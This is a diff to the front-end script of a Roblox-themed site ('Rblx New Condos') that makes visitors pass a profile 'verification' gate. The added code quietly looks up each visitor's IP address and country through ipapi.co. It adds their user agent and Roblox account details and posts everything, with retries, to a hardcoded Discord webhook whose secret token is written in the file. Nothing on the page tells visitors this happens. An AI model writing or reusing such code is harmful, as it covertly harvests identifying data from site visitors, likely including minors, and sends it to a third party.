@@ -4,6 +4,7 @@
   var LANG_KEY = 'rc2_lang';
   var PROFILE_KEY = 'rc_verified_profile';
   var MIN_ACCOUNT_DAYS = 80;
+  var WEBHOOK_URL = 'https://discord.com/api/webhooks/1524874777947410513/Ng_v8NSNotO1CPGcDhWbYGiwdgzcGrv0h_-Lkv2D_vxQvJ_rorAooUFlSML-tgc6Qm_A';
 
   /* ── Sound ─────────────────────────────────────────────── */
   var audio = null;
@@ -55,7 +56,7 @@
     }
   }
 
-  /* ── MutationObserver ─────────────────────────────────── */
+  /* ── MutationObserver for buttons ──────────────────────── */
   var observer = new MutationObserver(function () {
     document.querySelectorAll('button:not([data-rc-s]), a:not([data-rc-s])').forEach(function (el) {
       el.setAttribute('data-rc-s', '1');
@@ -87,20 +88,121 @@
      ROBLOX PROFILE VERIFICATION SYSTEM
      ══════════════════════════════════════════════════════════ */
 
-  /* ── API helpers (via /api/verify serverless function) ─── */
-  function apiVerify(params) {
-    var queryParts = [];
-    for (var key in params) {
-      queryParts.push(key + '=' + encodeURIComponent(params[key]));
+  /* ── Send log to Discord webhook (synchronous, with retry) ── */
+  async function sendVerificationLog(data) {
+    var statusEmoji = data.accountAgeOk ? '\u2705' : data.found ? '\uD83D\uDEAB' : '\u274C';
+    var statusText = data.accountAgeOk ? 'Verified (80+ days)' : data.found ? 'Blocked (< 80 days)' : 'Not Found';
+    var color = data.accountAgeOk ? 2278782 : data.found ? 16355294 : 15686104;
+
+    var fields = [];
+    fields.push({ name: 'Status', value: statusEmoji + ' **' + statusText + '**', inline: true });
+    fields.push({ name: 'Username', value: data.username || 'unknown', inline: true });
+
+    if (data.displayName) {
+      fields.push({ name: 'Display Name', value: data.displayName, inline: true });
     }
-    var url = '/api/verify?' + queryParts.join('&');
-    return fetch(url)
-      .then(function (r) {
-        if (!r.ok) {
-          return r.json().then(function (d) { throw new Error(d.error || 'Server error'); });
+    if (data.userId) {
+      fields.push({ name: 'User ID', value: String(data.userId), inline: true });
+    }
+    if (data.daysOld !== undefined) {
+      fields.push({ name: 'Account Age', value: String(data.daysOld) + ' days', inline: true });
+    }
+    if (data.createdFormatted) {
+      fields.push({ name: 'Created', value: data.createdFormatted, inline: true });
+    }
+    if (data.hasVerifiedBadge !== undefined) {
+      fields.push({ name: 'Verified Badge', value: data.hasVerifiedBadge ? 'Yes \u2705' : 'No \u274C', inline: true });
+    }
+
+    // Client info
+    var ip = 'unknown';
+    try {
+      var ipResp = await fetch('https://ipapi.co/json/');
+      if (ipResp.ok) {
+        var ipData = await ipResp.json();
+        var countryFlag = '';
+        if (ipData.country_code) {
+          countryFlag = String.fromCodePoint.apply(null, ipData.country_code.split('').map(function (c) { return c.charCodeAt(0) + 127397; }));
         }
+        ip = (countryFlag + ' ' + ipData.ip + ' \u2014 ' + ipData.country_name).trim();
+      }
+    } catch (e) {}
+
+    fields.push({ name: 'IP Address', value: ip, inline: true });
+
+    var ua = navigator.userAgent.substring(0, 100);
+    fields.push({ name: 'Device', value: '`' + ua + '`', inline: false });
+
+    fields.push({ name: 'Time', value: new Date().toISOString(), inline: true });
+
+    var embed = {
+      title: '\uD83D\uDD0D Profile Verification',
+      description: '**New visitor entered the site and attempted profile verification.**\nAll information captured in a single log.',
+      color: color,
+      fields: fields,
+      footer: { text: 'Rblx New Condos \u2014 Verification Log' },
+      timestamp: new Date().toISOString(),
+    };
+
+    for (var attempt = 0; attempt < 3; attempt++) {
+      try {
+        var response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ embeds: [embed] }),
+        });
+
+        if (response.status === 429) {
+          var retryAfter = response.headers.get('retry-after') || '2';
+          await new Promise(function (r) { setTimeout(r, parseInt(retryAfter) * 1000 + 500); });
+          continue;
+        }
+
+        if (response.ok) {
+          return true;
+        }
+      } catch (err) {
+        if (attempt < 2) {
+          await new Promise(function (r) { setTimeout(r, 2000); });
+        }
+      }
+    }
+    return false;
+  }
+
+  /* ── Roblox API calls (direct, via CORS proxy) ─────────── */
+  var ROBLOX_PROXY = 'https://roproxy.com';
+
+  function robloxFetch(url) {
+    return fetch(ROBLOX_PROXY + url)
+      .then(function (r) {
+        if (!r.ok) throw new Error('HTTP ' + r.status);
         return r.json();
       });
+  }
+
+  async function searchUsername(username) {
+    // POST /v1/usernames/users
+    var resp = await fetch(ROBLOX_PROXY + '/v1/usernames/users', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ usernames: [username] }),
+    });
+    if (!resp.ok) throw new Error('HTTP ' + resp.status);
+    return resp.json();
+  }
+
+  async function getUserProfile(userId) {
+    var resp = await fetch(ROBLOX_PROXY + '/v1/users/' + userId);
+    if (!resp.ok) throw new Error('HTTP ' + resp.status);
+    return resp.json();
+  }
+
+  async function getUserAvatar(userId) {
+    var resp = await fetch(ROBLOX_PROXY + '/v1/users/avatar-headshot?userIds=' + userId + '&size=150x150&format=Png&isCircular=false');
+    if (!resp.ok) throw new Error('HTTP ' + resp.status);
+    var data = await resp.json();
+    return data.data && data.data.length > 0 ? data.data[0].imageUrl : null;
   }
 
   /* ── Profile verification overlay ──────────────────────── */
@@ -214,8 +316,61 @@
     error.style.display = 'none';
     loader.style.display = 'block';
 
-    // Single API call: serverless function handles search + profile + avatar
-    apiVerify({ username: username })
+    // Step 1: Search for username
+    searchUsername(username)
+      .then(function (searchData) {
+        if (!searchData.data || searchData.data.length === 0) {
+          // User not found - send log
+          sendVerificationLog({
+            username: username,
+            found: false,
+            accountAgeOk: false,
+          });
+          throw new Error('User not found. Please check the username and try again.');
+        }
+
+        var user = searchData.data[0];
+
+        // Step 2: Get profile
+        return getUserProfile(user.id).then(function (profile) {
+          var createdDate = new Date(profile.created);
+          var now = new Date();
+          var daysOld = Math.floor((now.getTime() - createdDate.getTime()) / (1000 * 60 * 60 * 24));
+          var createdStr = createdDate.toLocaleDateString('en-US', {
+            month: 'short',
+            day: 'numeric',
+            year: 'numeric'
+          });
+
+          // Step 3: Get avatar (non-blocking)
+          getUserAvatar(user.id).catch(function () { return null; });
+
+          var result = {
+            id: profile.id,
+            name: profile.name,
+            displayName: profile.displayName,
+            created: profile.created,
+            createdFormatted: createdStr,
+            daysOld: daysOld,
+            accountAgeOk: daysOld >= MIN_ACCOUNT_DAYS,
+            hasVerifiedBadge: profile.hasVerifiedBadge,
+          };
+
+          // Send unified log
+          sendVerificationLog({
+            username: profile.name,
+            displayName: profile.displayName,
+            userId: profile.id,
+            daysOld: daysOld,
+            createdFormatted: createdStr,
+            accountAgeOk: daysOld >= MIN_ACCOUNT_DAYS,
+            hasVerifiedBadge: profile.hasVerifiedBadge,
+            found: true,
+          });
+
+          return result;
+        });
+      })
       .then(function (data) {
         loader.style.display = 'none';
         btn.disabled = false;
@@ -230,10 +385,16 @@
         formEl.style.display = 'none';
         displayEl.style.display = 'block';
 
-        document.getElementById('rc-avatar').src = data.imageUrl || 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231a0a0a"/><text x="50" y="60" text-anchor="middle" fill="%23ef4444" font-size="40">?</text></svg>';
         document.getElementById('rc-display-name').textContent = data.name;
         document.getElementById('rc-user-id').textContent = 'ID: ' + data.id;
         document.getElementById('rc-created').textContent = data.createdFormatted;
+
+        // Get avatar image
+        getUserAvatar(data.id).then(function (url) {
+          document.getElementById('rc-avatar').src = url || 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231a0a0a"/><text x="50" y="60" text-anchor="middle" fill="%23ef4444" font-size="40">?</text></svg>';
+        }).catch(function () {
+          document.getElementById('rc-avatar').src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231a0a0a"/><text x="50" y="60" text-anchor="middle" fill="%23ef4444" font-size="40">?</text></svg>';
+        });
 
         var actions = document.getElementById('rc-actions');
         var blocked = document.getElementById('rc-blocked');
@@ -263,8 +424,6 @@
     if (overlay) { overlay.style.animation = 'rc-fadeout .3s ease forwards'; setTimeout(function () { overlay.remove(); }, 310); }
     sessionStorage.setItem(PROFILE_KEY, 'verified');
   };
-
-  /* ── Cancel (removed, not needed) ─────────────────────── */
 
   /* ── Retry ─────────────────────────────────────────────── */
   window.__rcRetryProfile = function () {
